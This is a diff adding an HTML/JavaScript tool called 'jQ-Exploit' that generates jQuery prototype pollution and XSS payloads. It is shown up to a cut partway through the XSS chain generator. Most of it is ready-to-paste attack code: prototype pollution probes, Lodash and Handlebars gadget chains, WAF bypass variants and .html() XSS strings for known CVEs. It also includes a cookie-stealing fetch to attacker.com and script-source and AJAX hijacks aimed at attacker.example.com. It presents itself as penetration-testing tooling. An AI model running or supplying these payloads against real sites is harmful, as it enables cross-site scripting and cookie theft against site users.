@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>jQ-Exploit — jQuery Prototype Pollution & XSS Scanner</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&family=IBM+Plex+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --surface: #12121a;
+    --surface-2: #1a1a25;
+    --border: #2a2a3a;
+    --accent: #ff3e3e;
+    --accent-dim: #ff3e3e33;
+    --green: #00ff88;
+    --green-dim: #00ff8833;
+    --yellow: #ffd93d;
+    --yellow-dim: #ffd93d33;
+    --cyan: #00d4ff;
+    --cyan-dim: #00d4ff33;
+    --text: #e0e0e8;
+    --text-dim: #6a6a80;
+    --orange: #ff8c42;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'IBM Plex Mono', monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.03) 2px,
+      rgba(0,0,0,0.03) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  .app-container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 20px;
+  }
+
+  /* Header */
+  .header {
+    padding: 30px 0 20px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 30px;
+  }
+
+  .header h1 {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: -0.5px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .header h1 .version {
+    font-size: 11px;
+    background: var(--accent-dim);
+    color: var(--accent);
+    padding: 3px 8px;
+    border-radius: 3px;
+    font-weight: 500;
+    letter-spacing: 1px;
+  }
+
+  .header p {
+    color: var(--text-dim);
+    font-size: 13px;
+    margin-top: 8px;
+    line-height: 1.5;
+  }
+
+  /* Tabs */
+  .tabs {
+    display: flex;
+    gap: 2px;
+    margin-bottom: 24px;
+    background: var(--surface);
+    border-radius: 6px;
+    padding: 3px;
+    border: 1px solid var(--border);
+  }
+
+  .tab {
+    flex: 1;
+    padding: 10px 16px;
+    background: transparent;
+    border: none;
+    color: var(--text-dim);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12px;
+    font-weight: 500;
+    cursor: pointer;
+    border-radius: 4px;
+    transition: all 0.2s;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .tab:hover { color: var(--text); background: var(--surface-2); }
+  .tab.active { background: var(--accent); color: #fff; }
+
+  /* Panels */
+  .panel { display: none; }
+  .panel.active { display: block; }
+
+  /* Input group */
+  .input-group {
+    margin-bottom: 16px;
+  }
+
+  .input-group label {
+    display: block;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    color: var(--text-dim);
+    margin-bottom: 6px;
+    font-weight: 500;
+  }
+
+  .input-group input, .input-group textarea, .input-group select {
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 10px 14px;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 13px;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  .input-group input:focus, .input-group textarea:focus, .input-group select:focus {
+    border-color: var(--accent);
+  }
+
+  .input-group textarea {
+    min-height: 80px;
+    resize: vertical;
+  }
+
+  /* Buttons */
+  .btn {
+    padding: 10px 20px;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+
+  .btn-primary {
+    background: var(--accent);
+    color: #fff;
+  }
+  .btn-primary:hover { background: #ff5555; transform: translateY(-1px); }
+
+  .btn-secondary {
+    background: var(--surface-2);
+    color: var(--text);
+    border: 1px solid var(--border);
+  }
+  .btn-secondary:hover { border-color: var(--text-dim); }
+
+  .btn-group { display: flex; gap: 8px; margin-top: 16px; flex-wrap: wrap; }
+
+  /* Console output */
+  .console {
+    background: #000;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    line-height: 1.8;
+    max-height: 500px;
+    overflow-y: auto;
+    margin-top: 20px;
+  }
+
+  .console .line { white-space: pre-wrap; word-break: break-all; }
+  .console .info { color: var(--cyan); }
+  .console .success { color: var(--green); }
+  .console .warn { color: var(--yellow); }
+  .console .error { color: var(--accent); }
+  .console .dim { color: var(--text-dim); }
+  .console .highlight { color: var(--orange); }
+  .console .header-line {
+    color: var(--accent);
+    font-weight: 700;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 6px;
+    margin-bottom: 8px;
+  }
+
+  /* Results cards */
+  .results-grid {
+    display: grid;
+    gap: 12px;
+    margin-top: 20px;
+  }
+
+  .result-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+    border-left: 3px solid var(--accent);
+  }
+
+  .result-card.vuln { border-left-color: var(--accent); }
+  .result-card.info { border-left-color: var(--cyan); }
+  .result-card.safe { border-left-color: var(--green); }
+
+  .result-card h4 {
+    font-size: 13px;
+    font-weight: 700;
+    margin-bottom: 6px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .result-card .severity {
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 3px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    font-weight: 700;
+  }
+
+  .severity.critical { background: var(--accent-dim); color: var(--accent); }
+  .severity.high { background: #ff8c4233; color: var(--orange); }
+  .severity.medium { background: var(--yellow-dim); color: var(--yellow); }
+  .severity.low { background: var(--cyan-dim); color: var(--cyan); }
+
+  .result-card pre {
+    background: #000;
+    padding: 10px;
+    border-radius: 4px;
+    font-size: 11px;
+    overflow-x: auto;
+    margin-top: 8px;
+    line-height: 1.6;
+    color: var(--green);
+  }
+
+  .result-card p {
+    font-size: 12px;
+    color: var(--text-dim);
+    line-height: 1.5;
+    margin-top: 6px;
+  }
+
+  /* Copy button */
+  .copy-btn {
+    background: var(--surface-2);
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    padding: 4px 10px;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    border-radius: 3px;
+    cursor: pointer;
+    float: right;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  .copy-btn:hover { color: var(--text); border-color: var(--text-dim); }
+
+  /* Stats bar */
+  .stats-bar {
+    display: flex;
+    gap: 20px;
+    padding: 14px 0;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 20px;
+  }
+
+  .stat {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12px;
+  }
+
+  .stat .dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+  }
+
+  .stat .count {
+    font-weight: 700;
+    font-size: 16px;
+  }
+
+  /* Checkbox group */
+  .checkbox-group {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 12px;
+    margin: 12px 0;
+  }
+
+  .checkbox-group label {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 12px;
+    color: var(--text);
+    cursor: pointer;
+    text-transform: none;
+    letter-spacing: 0;
+  }
+
+  .checkbox-group input[type="checkbox"] {
+    width: 14px;
+    height: 14px;
+    accent-color: var(--accent);
+  }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text-dim); }
+
+  @media (max-width: 768px) {
+    .tabs { flex-wrap: wrap; }
+    .tab { font-size: 10px; padding: 8px 10px; }
+    .header h1 { font-size: 20px; }
+    .stats-bar { flex-wrap: wrap; gap: 12px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="app-container">
+  <div class="header">
+    <h1>jQ-Exploit <span class="version">v1.0</span></h1>
+    <p>Automated jQuery Prototype Pollution → XSS exploitation toolkit. Generates browser console payloads, tests gadget chains, and produces pentest-ready evidence.</p>
+  </div>
+
+  <div class="tabs">
+    <button class="tab active" onclick="switchTab('detect')">① Detect</button>
+    <button class="tab" onclick="switchTab('exploit')">② Exploit PP</button>
+    <button class="tab" onclick="switchTab('xss')">③ XSS Chains</button>
+    <button class="tab" onclick="switchTab('report')">④ Report</button>
+  </div>
+
+  <!-- ====== DETECT PANEL ====== -->
+  <div id="panel-detect" class="panel active">
+    <div class="input-group">
+      <label>Target jQuery Version</label>
+      <input type="text" id="jqVersion" placeholder="e.g. 1.12.4, 2.2.4, 3.3.1" value="1.12.4">
+    </div>
+    <div class="input-group">
+      <label>Target URL (optional — for report context)</label>
+      <input type="text" id="targetUrl" placeholder="https://target.example.com">
+    </div>
+    <div class="btn-group">
+      <button class="btn btn-primary" onclick="runDetection()">▶ Run Version Analysis</button>
+    </div>
+    <div id="detect-output" class="console"></div>
+    <div id="detect-results" class="results-grid"></div>
+  </div>
+
+  <!-- ====== EXPLOIT PP PANEL ====== -->
+  <div id="panel-exploit" class="panel">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:16px;line-height:1.6;">
+      Generate ready-to-paste browser console payloads for prototype pollution via jQuery.extend().
+      These payloads are designed for use on the target application's console.
+    </p>
+    <div class="input-group">
+      <label>Payload Categories</label>
+      <div class="checkbox-group">
+        <label><input type="checkbox" id="pp-basic" checked> Basic PP PoC</label>
+        <label><input type="checkbox" id="pp-dom" checked> DOM Property Injection</label>
+        <label><input type="checkbox" id="pp-gadgets" checked> Known Gadgets</label>
+        <label><input type="checkbox" id="pp-bypass" checked> WAF Bypass Variants</label>
+      </div>
+    </div>
+    <div class="btn-group">
+      <button class="btn btn-primary" onclick="generatePPPayloads()">▶ Generate Payloads</button>
+      <button class="btn btn-secondary" onclick="copyAllPayloads('pp')">Copy All</button>
+    </div>
+    <div id="pp-output" class="results-grid"></div>
+  </div>
+
+  <!-- ====== XSS CHAINS PANEL ====== -->
+  <div id="panel-xss" class="panel">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:16px;line-height:1.6;">
+      Generate PP→XSS exploit chains targeting known jQuery HTML parsing sinks and common JS library gadgets.
+    </p>
+    <div class="input-group">
+      <label>XSS Chain Type</label>
+      <div class="checkbox-group">
+        <label><input type="checkbox" id="xss-html" checked> jQuery .html() sink</label>
+        <label><input type="checkbox" id="xss-append" checked> jQuery .append() sink</label>
+        <label><input type="checkbox" id="xss-innerhtml" checked> innerHTML gadget</label>
+        <label><input type="checkbox" id="xss-srcdoc" checked> srcdoc / iframe</label>
+        <label><input type="checkbox" id="xss-eval" checked> eval() gadget</label>
+        <label><input type="checkbox" id="xss-script" checked> script.src gadget</label>
+      </div>
+    </div>
+    <div class="input-group">
+      <label>Custom XSS Callback (optional)</label>
+      <input type="text" id="xssCallback" placeholder="e.g. fetch('https://attacker.com/steal?c='+document.cookie)">
+    </div>
+    <div class="btn-group">
+      <button class="btn btn-primary" onclick="generateXSSChains()">▶ Generate XSS Chains</button>
+      <button class="btn btn-secondary" onclick="copyAllPayloads('xss')">Copy All</button>
+    </div>
+    <div id="xss-output" class="results-grid"></div>
+  </div>
+
+  <!-- ====== REPORT PANEL ====== -->
+  <div id="panel-report" class="panel">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:16px;line-height:1.6;">
+      Export all findings as a pentest-ready report with CVE references, payloads, and remediation guidance.
+    </p>
+    <div class="input-group">
+      <label>Engagement ID (optional)</label>
+      <input type="text" id="engagementId" placeholder="e.g. ASF-78">
+    </div>
+    <div class="input-group">
+      <label>Additional Notes</label>
+      <textarea id="reportNotes" placeholder="Any additional context for the report..."></textarea>
+    </div>
+    <div class="btn-group">
+      <button class="btn btn-primary" onclick="generateReport()">▶ Generate Report</button>
+      <button class="btn btn-secondary" onclick="copyReport()">Copy Report</button>
+    </div>
+    <div id="report-output" class="console"></div>
+  </div>
+</div>
+
+<script>
+// ===== STATE =====
+const state = {
+  version: '',
+  url: '',
+  cves: [],
+  ppPayloads: [],
+  xssChains: [],
+  findings: []
+};
+
+// ===== CVE DATABASE =====
+const CVE_DB = {
+  'CVE-2019-11358': {
+    title: 'Prototype Pollution via jQuery.extend()',
+    severity: 'Medium',
+    affected: '<3.4.0',
+    check: (v) => compareVersion(v, '3.4.0') < 0,
+    description: 'jQuery.extend(true, {}, untrustedObj) merges __proto__ properties into Object.prototype, allowing prototype pollution.',
+    cvss: '6.1',
+    references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-11358', 'https://github.com/jquery/jquery/commit/753d591']
+  },
+  'CVE-2020-11022': {
+    title: 'XSS via .html() with untrusted input',
+    severity: 'Medium',
+    affected: '>=1.2 <3.5.0',
+    check: (v) => compareVersion(v, '1.2.0') >= 0 && compareVersion(v, '3.5.0') < 0,
+    description: 'Passing HTML from untrusted sources to jQuery DOM manipulation methods (.html(), .append(), etc.) can execute XSS even with sanitization attempts.',
+    cvss: '6.1',
+    references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-11022', 'https://github.com/nicolo-ribaudo/jquery-xss-fix']
+  },
+  'CVE-2020-11023': {
+    title: 'XSS via .html() with option element',
+    severity: 'Medium',
+    affected: '>=1.0.3 <3.5.0',
+    check: (v) => compareVersion(v, '1.0.3') >= 0 && compareVersion(v, '3.5.0') < 0,
+    description: 'Passing HTML containing <option> elements from untrusted sources can execute arbitrary code via jQuery DOM manipulation methods.',
+    cvss: '6.1',
+    references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-11023']
+  },
+  'CVE-2015-9251': {
+    title: 'XSS via cross-domain AJAX responses',
+    severity: 'Medium',
+    affected: '<3.0.0',
+    check: (v) => compareVersion(v, '3.0.0') < 0,
+    description: 'jQuery before 3.0.0 is vulnerable to XSS attacks when a cross-domain Ajax request is performed without the dataType option, causing text/javascript responses to be executed.',
+    cvss: '6.1',
+    references: ['https://nvd.nist.gov/vuln/detail/CVE-2015-9251']
+  },
+  'CVE-2012-6708': {
+    title: 'XSS via $(selector) with untrusted input',
+    severity: 'Medium',
+    affected: '<1.9.0',
+    check: (v) => compareVersion(v, '1.9.0') < 0,
+    description: 'jQuery before 1.9.0 allows XSS via the selector string when it begins with a # but contains HTML after.',
+    cvss: '6.1',
+    references: ['https://nvd.nist.gov/vuln/detail/CVE-2012-6708']
+  }
+};
+
+// ===== VERSION COMPARE =====
+function compareVersion(a, b) {
+  const pa = a.split('.').map(Number);
+  const pb = b.split('.').map(Number);
+  for (let i = 0; i < 3; i++) {
+    const na = pa[i] || 0, nb = pb[i] || 0;
+    if (na > nb) return 1;
+    if (na < nb) return -1;
+  }
+  return 0;
+}
+
+// ===== TAB SWITCHING =====
+function switchTab(id) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('panel-' + id).classList.add('active');
+  event.target.classList.add('active');
+}
+
+// ===== CONSOLE LOGGING =====
+function logTo(elementId, lines) {
+  const el = document.getElementById(elementId);
+  el.innerHTML = lines.map(l => `<div class="line ${l.cls || ''}">${l.text}</div>`).join('');
+}
+
+// ===== COPY HELPERS =====
+function copyText(text) {
+  navigator.clipboard.writeText(text).then(() => {
+    const btn = event.target;
+    const orig = btn.textContent;
+    btn.textContent = 'Copied!';
+    setTimeout(() => btn.textContent = orig, 1200);
+  });
+}
+
+function copyAllPayloads(type) {
+  const payloads = type === 'pp' ? state.ppPayloads : state.xssChains;
+  const text = payloads.map((p, i) => `// --- Payload ${i+1}: ${p.title} ---\n${p.code}\n`).join('\n');
+  navigator.clipboard.writeText(text).then(() => alert('All payloads copied to clipboard!'));
+}
+
+function copyReport() {
+  const el = document.getElementById('report-output');
+  navigator.clipboard.writeText(el.innerText).then(() => alert('Report copied!'));
+}
+
+// ===== DETECTION =====
+function runDetection() {
+  const version = document.getElementById('jqVersion').value.trim();
+  const url = document.getElementById('targetUrl').value.trim();
+  if (!version) { alert('Enter a jQuery version'); return; }
+
+  state.version = version;
+  state.url = url;
+  state.cves = [];
+
+  const lines = [
+    { text: `[jQ-Exploit] Version Analysis Engine`, cls: 'header-line' },
+    { text: ``, cls: 'dim' },
+    { text: `[*] Target jQuery version: ${version}`, cls: 'info' },
+    { text: `[*] Target URL: ${url || '(not specified)'}`, cls: 'info' },
+    { text: `[*] Scanning CVE database...`, cls: 'dim' },
+    { text: ``, cls: 'dim' }
+  ];
+
+  let vulnCount = 0;
+  for (const [cveId, cve] of Object.entries(CVE_DB)) {
+    if (cve.check(version)) {
+      state.cves.push({ id: cveId, ...cve });
+      vulnCount++;
+      lines.push({ text: `[!] VULNERABLE — ${cveId}: ${cve.title}`, cls: 'error' });
+      lines.push({ text: `    Severity: ${cve.severity} (CVSS ${cve.cvss}) | Affected: ${cve.affected}`, cls: 'warn' });
+      lines.push({ text: ``, cls: 'dim' });
+    } else {
+      lines.push({ text: `[✓] NOT AFFECTED — ${cveId}`, cls: 'success' });
+    }
+  }
+
+  lines.push({ text: ``, cls: 'dim' });
+  lines.push({
+    text: vulnCount > 0
+      ? `[!] RESULT: ${vulnCount} vulnerabilities found. Proceed to Exploit PP and XSS Chains tabs.`
+      : `[✓] RESULT: No known vulnerabilities for jQuery ${version}.`,
+    cls: vulnCount > 0 ? 'error' : 'success'
+  });
+
+  // Quick detection script to paste in console
+  lines.push({ text: ``, cls: 'dim' });
+  lines.push({ text: `────────────────────────────────────────`, cls: 'dim' });
+  lines.push({ text: `[*] Quick Console Detection Script (paste in target browser):`, cls: 'info' });
+  lines.push({ text: ``, cls: 'dim' });
+  lines.push({ text: `// Step 1: Check jQuery version`, cls: 'highlight' });
+  lines.push({ text: `if(typeof jQuery!=='undefined'){console.log('[+] jQuery '+jQuery.fn.jquery+' detected')}else{console.log('[-] No jQuery found')}`, cls: 'success' });
+  lines.push({ text: ``, cls: 'dim' });
+  lines.push({ text: `// Step 2: Test Prototype Pollution`, cls: 'highlight' });
+  lines.push({ text: `(function(){var a={};$.extend(true,a,JSON.parse('{"__proto__":{"_jqExploitTest":"vulnerable"}}'));if({}._jqExploitTest==="vulnerable"){console.log("[!] PP CONFIRMED");delete Object.prototype._jqExploitTest}else{console.log("[-] PP not exploitable")}})()`, cls: 'success' });
+
+  logTo('detect-output', lines);
+
+  // Results cards
+  const resultsHtml = state.cves.map(cve => `
+    <div class="result-card vuln">
+      <h4>
+        <span class="severity ${cve.severity.toLowerCase()}">${cve.severity}</span>
+        ${cve.id}
+      </h4>
+      <p><strong>${cve.title}</strong></p>
+      <p>${cve.description}</p>
+      <p style="color:var(--text-dim);margin-top:8px;font-size:11px;">CVSS: ${cve.cvss} | Affected: ${cve.affected}</p>
+    </div>
+  `).join('');
+  document.getElementById('detect-results').innerHTML = resultsHtml;
+}
+
+// ===== PROTOTYPE POLLUTION PAYLOADS =====
+function generatePPPayloads() {
+  state.ppPayloads = [];
+  const container = document.getElementById('pp-output');
+  let html = '';
+
+  const categories = {
+    basic: document.getElementById('pp-basic').checked,
+    dom: document.getElementById('pp-dom').checked,
+    gadgets: document.getElementById('pp-gadgets').checked,
+    bypass: document.getElementById('pp-bypass').checked
+  };
+
+  // BASIC PP
+  if (categories.basic) {
+    const payloads = [
+      {
+        title: 'Basic PP PoC — $.extend deep merge',
+        severity: 'medium',
+        code: `// CVE-2019-11358 — Basic Prototype Pollution PoC
+// Paste in browser console on target application
+
+// Pollute Object.prototype via jQuery.extend
+$.extend(true, {}, JSON.parse('{"__proto__":{"ppTest":"polluted"}}'));
+
+// Verify pollution
+if ({}.ppTest === "polluted") {
+  console.log("%c[!] PROTOTYPE POLLUTION CONFIRMED", "color:red;font-weight:bold");
+  console.log("[+] Every new object now has .ppTest = 'polluted'");
+  console.log("[+] Proof:", {}.ppTest);
+} else {
+  console.log("[-] Not vulnerable or already patched");
+}
+
+// Cleanup (important!)
+delete Object.prototype.ppTest;`,
+        impact: 'Confirms CVE-2019-11358 is exploitable. This is the baseline proof.'
+      },
+      {
+        title: 'PP via nested merge path',
+        severity: 'medium',
+        code: `// Alternative PP vector — nested object path
+var malicious = JSON.parse('{"__proto__":{"isAdmin":true,"role":"admin","debug":true}}');
+$.extend(true, {}, malicious);
+
+console.log("isAdmin on empty obj:", {}.isAdmin);
+console.log("role on empty obj:", {}.role);
+console.log("debug on empty obj:", {}.debug);
+
+// Cleanup
+delete Object.prototype.isAdmin;
+delete Object.prototype.role;
+delete Object.prototype.debug;`,
+        impact: 'Demonstrates injecting multiple properties. If app checks obj.isAdmin or obj.role without hasOwnProperty, logic can be subverted.'
+      },
+      {
+        title: 'PP persistence check',
+        severity: 'medium',
+        code: `// Test if PP persists across jQuery operations
+$.extend(true, {}, JSON.parse('{"__proto__":{"ppPersist":"yes"}}'));
+
+// Create objects via different methods
+var a = {};
+var b = new Object();
+var c = Object.create({});
+var d = jQuery.extend({}, {});
+
+console.log("Literal:", a.ppPersist);
+console.log("new Object:", b.ppPersist);
+console.log("Object.create({}):", c.ppPersist);
+console.log("jQuery.extend:", d.ppPersist);
+
+delete Object.prototype.ppPersist;`,
+        impact: 'Confirms pollution scope — affects ALL object creation patterns on the page.'
+      }
+    ];
+    payloads.forEach(p => state.ppPayloads.push(p));
+  }
+
+  // DOM PROPERTY INJECTION
+  if (categories.dom) {
+    const payloads = [
+      {
+        title: 'PP → innerHTML sink injection',
+        severity: 'high',
+        code: `// PP → innerHTML gadget
+// If any JS on the page does: element.innerHTML = obj.someProperty
+// and someProperty is not defined, it falls through to Object.prototype
+
+$.extend(true, {}, JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(document.domain)>"}}'));
+
+// Check:
+console.log("Polluted innerHTML:", {}.innerHTML);
+console.log("[*] If any code reads obj.innerHTML from a polluted object, XSS fires.");
+
+delete Object.prototype.innerHTML;`,
+        impact: 'If any code path reads .innerHTML from an object without own property, attacker HTML is injected into the DOM.'
+      },
+      {
+        title: 'PP → src / href property hijack',
+        severity: 'high',
+        code: `// Pollute src/href — targets lazy property access
+$.extend(true, {}, JSON.parse('{"__proto__":{"src":"https://attacker.example.com/evil.js","href":"javascript:alert(document.domain)"}}'));
+
+console.log("Polluted src:", {}.src);
+console.log("Polluted href:", {}.href);
+console.log("[*] Any code that reads obj.src or obj.href from unpopulated objects will use these values");
+
+delete Object.prototype.src;
+delete Object.prototype.href;`,
+        impact: 'Targets code that dynamically creates script/link/img/a elements using object properties.'
+      },
+      {
+        title: 'PP → template / data-* attribute injection',
+        severity: 'medium',
+        code: `// Pollute common template-related properties
+$.extend(true, {}, JSON.parse('{"__proto__":{"template":"<img src=x onerror=alert(1)>","data-url":"javascript:alert(1)","data-action":"javascript:alert(1)"}}'));
+
+console.log("Polluted template:", {}.template);
+console.log("[*] Targets templating engines and data-attribute driven JS");
+
+delete Object.prototype.template;
+delete Object.prototype["data-url"];
+delete Object.prototype["data-action"];`,
+        impact: 'Effective against apps using client-side templating or data-attribute driven JavaScript.'
+      }
+    ];
+    payloads.forEach(p => state.ppPayloads.push(p));
+  }
+
+  // KNOWN GADGETS
+  if (categories.gadgets) {
+    const payloads = [
+      {
+        title: 'PP Gadget → Lodash template RCE',
+        severity: 'critical',
+        code: `// If target uses Lodash alongside jQuery
+// PP into Lodash _.template() sourceURL option → code execution
+
+$.extend(true, {}, JSON.parse('{"__proto__":{"sourceURL":"\\u000areturn x]});alert(document.domain)//","variable":"x"}}'));
+
+// If any code calls _.template(str)(data), the injected sourceURL executes.
+console.log("[*] Lodash template gadget planted");
+console.log("[*] Trigger: any _.template() call on the page");
+
+delete Object.prototype.sourceURL;
+delete Object.prototype.variable;`,
+        impact: 'If Lodash is present and _.template() is called anywhere, this achieves XSS. Check for Lodash with: typeof _ !== "undefined" && _.VERSION'
+      },
+      {
+        title: 'PP Gadget → jQuery $.get/$.ajax URL override',
+        severity: 'high',
+        code: `// Pollute the 'url' property — targets $.ajax calls with incomplete options
+$.extend(true, {}, JSON.parse('{"__proto__":{"url":"https://attacker.example.com/exfil","type":"GET","crossDomain":true}}'));
+
+// If any code does: $.ajax({success: function(d){...}}) without explicit url,
+// it will hit attacker-controlled URL
+console.log("[*] AJAX url gadget planted:", {}.url);
+console.log("[*] Waiting for any $.ajax() call without explicit url parameter...");
+
+delete Object.prototype.url;
+delete Object.prototype.type;
+delete Object.prototype.crossDomain;`,
+        impact: 'Any subsequent $.ajax() call that omits the url parameter will use the polluted URL, potentially exfiltrating data or loading malicious content.'
+      },
+      {
+        title: 'PP Gadget → Handlebars/Mustache template injection',
+        severity: 'high',
+        code: `// If Handlebars is present on the page
+$.extend(true, {}, JSON.parse('{"__proto__":{"__defineGetter__":"","__lookupGetter__":"","constructor":{"name":""}}}'));
+
+// More targeted Handlebars gadget:
+$.extend(true, {}, JSON.parse('{"__proto__":{"pendingContent":"<img src=x onerror=alert(document.domain)>"}}'));
+
+console.log("[*] Handlebars/template gadget planted");
+console.log("[*] Check for Handlebars: typeof Handlebars !== 'undefined'");
+
+delete Object.prototype.pendingContent;`,
+        impact: 'Targets Handlebars template compilation. pendingContent is injected directly into rendered output.'
+      }
+    ];
+    payloads.forEach(p => state.ppPayloads.push(p));
+  }
+
+  // WAF BYPASS
+  if (categories.bypass) {
+    const payloads = [
+      {
+        title: 'PP with constructor.prototype bypass',
+        severity: 'medium',
+        code: `// Bypass __proto__ keyword filters using constructor.prototype
+// Some WAFs block "__proto__" but not "constructor"
+
+$.extend(true, {}, JSON.parse('{"constructor":{"prototype":{"ppBypass1":"polluted_via_constructor"}}}'));
+console.log("constructor.prototype bypass:", {}.ppBypass1);
+delete Object.prototype.ppBypass1;`,
+        impact: 'Bypasses WAFs or input filters that block __proto__ string but allow constructor.'
+      },
+      {
+        title: 'PP with Unicode escape bypass',
+        severity: 'medium',
+        code: `// Unicode-escaped __proto__ key
+// \\u005f = underscore
+var payload = '{"\\u005f\\u005fproto\\u005f\\u005f":{"ppUnicode":"bypassed"}}';
+$.extend(true, {}, JSON.parse(payload));
+console.log("Unicode bypass:", {}.ppUnicode);
+delete Object.prototype.ppUnicode;`,
+        impact: 'Bypasses simple string matching on __proto__ by using Unicode escape sequences.'
+      },
+      {
+        title: 'PP via query string (reflected)',
+        severity: 'high',
+        code: `// For apps that parse query params into objects then merge via $.extend
+// Craft URL: https://target.com/?__proto__[polluted]=xss_here
+//
+// Test locally:
+function parseQS(qs) {
+  var obj = {};
+  qs.replace(/([^=&]+)=([^&]*)/g, function(_, k, v) {
+    var keys = k.replace(/\\]/g, '').split('[');
+    var cur = obj;
+    for (var i = 0; i < keys.length - 1; i++) {
+      if (!cur[keys[i]]) cur[keys[i]] = {};
+      cur = cur[keys[i]];
+    }
+    cur[keys[keys.length-1]] = decodeURIComponent(v);
+  });
+  return obj;
+}
+
+var maliciousQS = "__proto__[polluted]=reflected_pp";
+var parsed = parseQS(maliciousQS);
+$.extend(true, {}, parsed);
+console.log("Reflected PP:", {}.polluted);
+delete Object.prototype.polluted;
+
+console.log("[*] If the app does $.extend(true, config, parsedQueryParams),");
+console.log("[*] then ?__proto__[prop]=value in the URL triggers PP.");`,
+        impact: 'Critical finding if the app merges URL parameters into objects — allows REMOTE prototype pollution with no user interaction beyond clicking a link.'
+      }
+    ];
+    payloads.forEach(p => state.ppPayloads.push(p));
+  }
+
+  // Render
+  html = state.ppPayloads.map((p, i) => `
+    <div class="result-card vuln">
+      <h4>
+        <span class="severity ${p.severity}">${p.severity.toUpperCase()}</span>
+        ${p.title}
+      </h4>
+      <p>${p.impact}</p>
+      <pre><button class="copy-btn" onclick="copyText(\`${escapeForTemplate(p.code)}\`)">Copy</button>${escapeHtml(p.code)}</pre>
+    </div>
+  `).join('');
+
+  container.innerHTML = html;
+}
+
+// ===== XSS CHAINS =====
+function generateXSSChains() {
+  state.xssChains = [];
+  const container = document.getElementById('xss-output');
+  const callback = document.getElementById('xssCallback').value.trim() || 'alert(document.domain)';
+
+  const categories = {
+    html: document.getElementById('xss-html').checked,
+    append: document.getElementById('xss-append').checked,
+    innerhtml: document.getElementById('xss-innerhtml').checked,
+    srcdoc: document.getElementById('xss-srcdoc').checked,
+    evalGadget: document.getElementById('xss-eval').checked,
+    scriptSrc: document.getElementById('xss-script').checked
+  };
+
+  if (categories.html) {
+    state.xssChains.push({
+      title: 'CVE-2020-11022 — .html() XSS',
+      severity: 'high',
+      code: `// CVE-2020-11022: jQuery .html() XSS
+// jQuery < 3.5.0 doesn't properly sanitize HTML passed to .html()
+
+// Method 1: Direct .html() with crafted payload
+$('<div>').html('<style><style/><img src=x onerror="${escapeForCode(callback)}">');
+
+// Method 2: Via option element (CVE-2020-11023)
+$('<div>').html('<option><style></option></select><img src=x onerror="${escapeForCode(callback)}">');
+
+// Method 3: Use existing page element
+// Find any visible container and inject:
+// $('body').append('<div>').html('<style><style/><img src=x onerror="${escapeForCode(callback)}">');`,
+      impact: 'Direct XSS via jQuery HTML parsing bypass. Works on any jQuery < 3.5.0 without needing prototype pollution.'
+    });
+  }
+
+  if (categories.append) {
+    state.xssChains.push({
+      title: 'CVE-2020-11022 — .append() XSS',
+      severity: 'high',
+      code: `// .append() uses the same HTML parser as .html()
